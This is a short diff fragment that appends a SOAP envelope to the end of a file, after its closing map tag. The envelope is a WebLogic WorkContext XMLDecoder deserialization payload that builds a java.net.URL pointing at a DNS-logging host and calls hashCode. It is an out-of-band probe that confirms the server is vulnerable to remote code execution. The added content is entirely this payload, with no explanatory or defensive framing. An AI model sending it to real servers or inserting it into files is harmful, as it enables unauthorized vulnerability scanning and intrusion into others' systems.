@@ -160,3 +160,16 @@
 </map>
 
 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java class="java.beans.XMLDecoder">
+                <object class="java.net.URL">
+                    <string>http://www.dnslog.com</string>
+                    <void method="hashCode"/>
+                </object>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
+</soapenv:Envelope>
